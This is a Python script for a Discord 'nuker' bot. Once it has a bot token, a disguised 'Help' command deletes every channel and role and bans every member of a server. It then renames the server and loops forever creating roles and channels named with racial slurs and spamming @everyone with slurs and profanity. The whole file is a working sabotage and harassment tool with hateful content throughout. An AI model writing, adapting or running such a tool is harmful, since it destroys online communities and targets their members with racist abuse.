import discord
from discord.ext import commands
import asyncio

def ask_question(question):
    print(question)
    response = input()
    return response.lower()

def ask_token(question):
    print(question)
    response = input()
    return response

token = ask_token("bot token")
delete_channels = ask_question("Delete all channels? (y/n)") == 'y'
delete_roles = ask_question("Delete all roles? (y/n)") == 'y'
ban_option = ask_question("Ban members? (y/n): ") == "y"
intents = discord.Intents.all()  # or any specific intents you need
bot = commands.Bot(command_prefix='s!', intents=intents)


@bot.event
async def on_ready():
    print("Party pooper 3000 has booted")


@bot.command(name='Help', pass_context=True)
@commands.has_permissions(manage_channels=True, ban_members=True, manage_roles=True, manage_guild=True)
async def help_command(ctx):
    ctx.send("ok sir :)")
    if delete_channels:
        #Delete all channels
        for channel in bot.guilds[0].channels:
            try:
                await channel.delete()
                await asyncio.sleep(0.55)
            except:
                continue

    if delete_roles:
        #Delete all roles
        for role in bot.guilds[0].roles:
            try:
                await role.delete()
                await asyncio.sleep(0.55)
            except:
                continue

    if ban_option:
        # Ban all members
        for member in bot.guilds[0].members:
            try:
                await member.ban(reason="Get nuked NIGGERS")
                await asyncio.sleep(0.55)
            except:
                continue
                        
     # Change server name
    await ctx.guild.edit(name="get nuked NIGGERS")
    print(f'Server name has been changed to: {ctx.guild.name}')
    
    
    # Create new roles repeatedly from a list
    while True:  # This will create an infinite loop
        await ctx.guild.create_role(name="NIGGER")
        await asyncio.sleep(0.55)
        hannel = await ctx.guild.create_text_channel("NIGGERS")
        await asyncio.sleep(0.55)
        for channel in ctx.guild.channels:
            if isinstance(channel, discord.TextChannel):  # Check if the channel is a text channel
                await channel.send("fuck you @everyone")
                await asyncio.sleep(0.55)
                await channel.send("FUCK ME @everyone")
                await asyncio.sleep(0.55)
                await channel.send("NIGGER @everyone")
        

bot.run(token)  # replace with your bot's token
